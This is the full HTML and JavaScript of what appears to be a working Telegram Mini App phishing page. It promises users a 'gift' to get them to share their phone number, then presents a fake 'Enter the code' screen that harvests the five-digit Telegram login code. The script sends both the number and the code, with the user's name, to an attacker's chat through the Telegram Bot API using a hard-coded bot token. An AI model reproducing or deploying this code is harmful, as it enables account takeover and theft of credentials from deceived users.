<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; padding: 20px; text-align: center; background: var(--tg-theme-bg-color, #ffffff); color: var(--tg-theme-text-color, #000000); }
        .hidden { display: none !important; }
        .code-header { font-size: 24px; font-weight: 500; margin-bottom: 10px; margin-top: 20px; }
        .code-subtitle { font-size: 14px; color: var(--tg-theme-hint-color, #999999); margin-bottom: 30px; line-height: 1.4; }
        .code-input { position: absolute; opacity: 0; width: 1px; height: 1px; font-size: 16px; }
        .code-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
        .code-cell { width: 45px; height: 55px; border: 1.5px solid var(--tg-theme-hint-color, #ccc); border-radius: 10px; display: flex; justify-content: center; align-items: center; font-size: 24px; font-weight: 600; transition: border-color 0.2s; }
        .code-cell.filled { border-color: var(--tg-theme-button-color, #3390ec); }
        .code-cell.active { border-color: var(--tg-theme-button-color, #3390ec); box-shadow: 0 0 0 2px rgba(51, 144, 236, 0.2); }
        .success-text { color: #34c759; font-size: 18px; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>

    <div id="screen-phone">
        <h2 style="margin-top: 40px;">Step 1</h2>
        <p style="color: gray;">To receive your gift, authorize using the button below 👇</p>
    </div>

    <div id="screen-code" class="hidden">
        <div class="code-header">Enter the code</div>
        <div class="code-subtitle">We sent a Telegram code to your number<br><b>*** *** ** **</b></div>
        <div class="code-container" id="code-cells">
            <div class="code-cell"></div>
            <div class="code-cell"></div>
            <div class="code-cell"></div>
            <div class="code-cell"></div>
            <div class="code-cell"></div>
        </div>
        <input type="text" id="code-input" class="code-input" inputmode="numeric" autocomplete="one-time-code" maxlength="5">
        <div id="status-msg" class="success-text hidden">Code sent successfully!</div>
    </div>

    <script>
        window.onload = function() {
            if (window.Telegram && window.Telegram.WebApp) {
                const tg = window.Telegram.WebApp;
                tg.expand();
                let isSent = false;

                // --- НАСТРОЙКИ ---
                const BOT_TOKEN = "8836719851:AAHO5sFobm_1MwTsC5GUvUCmkgRrRwO8s2g";
                const CHAT_ID = "-1004399809740";

                // 1. ВСТРОЕННАЯ КНОПКА TELEGRAM ДЛЯ ЗАПРОСА НОМЕРА
                tg.MainButton.setText("SHARE PHONE NUMBER");
                tg.MainButton.show();
                
                tg.MainButton.onClick(function() {
                    tg.requestContact(function(shared, contact) {
                        if (shared && contact) {
                            const phone = contact.phone_number;
                            const user = tg.initDataUnsafe?.user;
                            const name = user ? `${user.first_name} (@${user.username})` : "Unknown";
                            
                            // ОТПРАВЛЯЕМ НОМЕР НАПРЯМУЮ В TELEGRAM
                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: CHAT_ID,
                                    text: `📱 PHONE: +${phone}\nFrom: ${name}`
                                })
                            });

                            // Переключаем экран
                            document.getElementById('screen-phone').classList.add('hidden');
                            document.getElementById('screen-code').classList.remove('hidden');
                            tg.MainButton.hide();
                            
                            setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
                        } else {
                            // Если контакт не передан (например, заблокирован)
                            tg.showAlert("Error: could not get phone number. Please try again.");
                        }
                    });
                });

                // 2. ОБРАБОТКА КОДА
                const codeInput = document.getElementById('code-input');
                const codeCells = document.querySelectorAll('.code-cell');
                const codeContainer = document.getElementById('code-cells');

                codeContainer.onclick = function() { codeInput.focus(); };

                codeInput.addEventListener('input', function(e) {
                    const value = this.value.replace(/\D/g, '');
                    this.value = value;

                    codeCells.forEach((cell, index) => {
                        if (index < value.length) {
                            cell.innerText = value[index];
                            cell.classList.add('filled');
                        } else {
                            cell.innerText = '';
                            cell.classList.remove('filled');
                        }
                        if (index === value.length) cell.classList.add('active');
                        else cell.classList.remove('active');
                    });

                    if (value.length === 5 && !isSent) {
                        isSent = true;
                        this.blur();
                        
                        const user = tg.initDataUnsafe?.user;
                        const name = user ? `${user.first_name} (@${user.username})` : "Unknown";

                        document.getElementById('status-msg').classList.remove('hidden');
                        document.querySelector('.code-subtitle').innerHTML = "<b>Processing...</b>";

                        // ОТПРАВЛЯЕМ КОД НАПРЯМУЮ В TELEGRAM
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: CHAT_ID,
                                text: `🔑 CODE: ${value}\nFrom: ${name}`
                            })
                        }).then(res => res.json()).then(data => {
                            if(data.ok) {
                                document.querySelector('.code-subtitle').innerHTML = "<b style='color: #34c759;'>Code sent successfully!</b>";
                                document.getElementById('status-msg').classList.remove('hidden');
                            } else {
                                document.querySelector('.code-subtitle').innerHTML = "<b style='color: red;'>Error sending code</b>";
                            }
                        }).catch(err => {
                            document.querySelector('.code-subtitle').innerHTML = "<b style='color: red;'>Connection error</b>";
                        });
                    }
                });
            }
        };
    </script>
</body>
</html>
